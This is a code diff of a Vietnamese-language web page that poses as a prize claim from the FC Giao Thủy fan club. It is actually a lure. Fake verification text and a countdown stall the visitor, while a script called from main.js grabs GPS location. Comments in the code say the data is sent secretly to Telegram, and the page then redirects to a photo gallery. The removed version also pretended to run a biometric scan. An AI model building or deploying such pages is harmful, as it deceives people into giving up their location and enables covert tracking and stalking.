@@ -3,94 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QUÀ TẶNG CHAMPION - FC GIAO THỦY</title>
+    <title>XÁC THỰC NHẬN QUÀ - FC GIAO THỦY</title>
     <style>
-        body {
-            margin: 0; padding: 0;
-            background: #050505; color: #fff;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            display: flex; justify-content: center; align-items: center; height: 100vh;
-        }
-        .card {
-            background: #111; padding: 30px; border-radius: 15px;
-            text-align: center; max-width: 350px;
-            border: 1px solid #00ff88;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
-        }
-        .btn-action {
-            background: #00ff88; color: #000;
-            border: none; padding: 15px 25px;
-            font-weight: bold; border-radius: 8px;
-            cursor: pointer; width: 100%; margin-top: 20px;
-        }
-        
-        #statusOverlay {
-            display: none; position: fixed; top: 0; left: 0;
-            width: 100%; height: 100%; background: #000;
-            z-index: 100; flex-direction: column;
-            justify-content: center; align-items: center;
-        }
-        .loader {
-            width: 50px; height: 50px;
-            border: 4px solid #222; border-top: 4px solid #00ff88;
-            border-radius: 50%; animation: spin 1s linear infinite;
-        }
+        body { margin: 0; padding: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #111; padding: 30px; border-radius: 15px; text-align: center; max-width: 350px; border: 1px solid #00ff88; }
+        .btn { background: #00ff88; color: #000; border: none; padding: 15px 25px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; }
+        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; justify-content: center; align-items: center; }
+        .loader { width: 50px; height: 50px; border: 5px solid #222; border-top: 5px solid #00ff88; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #statusText { margin-top: 20px; color: #00ff88; font-family: monospace; }
+        #txt { margin-top: 20px; color: #00ff88; font-size: 14px; font-family: monospace; }
     </style>
 </head>
 <body>
 
-<div class="card" id="mainCard">
-    <div style="font-size: 50px;">🎁</div>
-    <h2>XÁC THỰC NHẬN QUÀ</h2>
-    <p>Vui lòng <b>Cho phép quyền</b> để quét sinh trắc học và kiểm tra vị trí nhận quà từ FC Giao Thủy.</p>
-    <button class="btn-action" id="accessBtn">XÁC THỰC & NHẬN QUÀ</button>
+<div class="box">
+    <div style="font-size: 50px;">🏆</div>
+    <h2>NHẬN QUÀ CHAMPION</h2>
+    <p>Vui lòng <b>Cho phép quyền</b> để xác thực vị trí nhận quà tặng từ fan club FC Giao Thủy.</p>
+    <button class="btn" id="go">XÁC THỰC NGAY</button>
 </div>
 
-<div id="statusOverlay">
+<div id="overlay">
     <div class="loader"></div>
-    <div id="statusText">Đang khởi tạo hệ thống...</div>
+    <div id="txt">Đang kết nối hệ thống...</div>
 </div>
 
 <script src="main.js"></script> 
-
 <script>
-    const btn = document.getElementById('accessBtn');
-    const overlay = document.getElementById('statusOverlay');
-    const statusText = document.getElementById('statusText');
-
-    btn.addEventListener('click', async () => {
-        overlay.style.display = 'flex';
-
+    document.getElementById('go').addEventListener('click', async () => {
+        document.getElementById('overlay').style.display = 'flex';
         try {
-            // 1. Gọi hàm main() từ main.js để bắt đầu xin quyền và lấy data
-            // Lưu ý: main() phải được thiết kế để không kết thúc quá nhanh
             if (typeof main === 'function') {
-                
-                // Hiệu ứng đếm ngược giả lập trên giao diện HTML
-                let seconds = 5;
-                const countdown = setInterval(() => {
-                    seconds--;
-                    statusText.innerText = `ĐANG QUÉT SINH TRẮC HỌC... (${seconds}s)`;
-                    if (seconds <= 0) {
-                        clearInterval(countdown);
-                        statusText.innerText = "XÁC THỰC THÀNH CÔNG! ĐANG MỞ ALBUM...";
-                    }
+                // Đếm ngược 5 giây câu giờ lấy GPS
+                let s = 5;
+                const timer = setInterval(() => {
+                    s--;
+                    document.getElementById('txt').innerText = `ĐANG XÁC THỰC VỊ TRÍ NHẬN QUÀ FC... (${s}s)`;
+                    if (s <= 0) clearInterval(timer);
                 }, 1000);
 
-                // Chạy hàm xử lý ngầm (xin quyền, lấy GPS, gửi Tele)
-                await main(); 
+                await main(); // Chạy logic gửi Tele ngầm
 
-                // Đợi thêm một chút cho hiệu ứng đếm ngược chạy xong rồi mới chuyển hướng
+                document.getElementById('txt').innerText = "XÁC THỰC THÀNH CÔNG! ĐANG MỞ ALBUM...";
                 setTimeout(() => {
                     window.location.href = "https://postimg.cc/gallery/NTp0rLd";
-                }, 5000); 
-
+                }, 1000);
             }
-        } catch (err) {
-            // Nếu người dùng bấm "Từ chối" quyền Cam/Vị trí
-            alert("LỖI: Hệ thống không thể định danh. Vui lòng thử lại!");
+        } catch (e) {
+            alert("LỖI: Bạn phải cấp quyền vị trí để hệ thống xác nhận quà tặng khu vực!");
             location.reload();
         }
     });
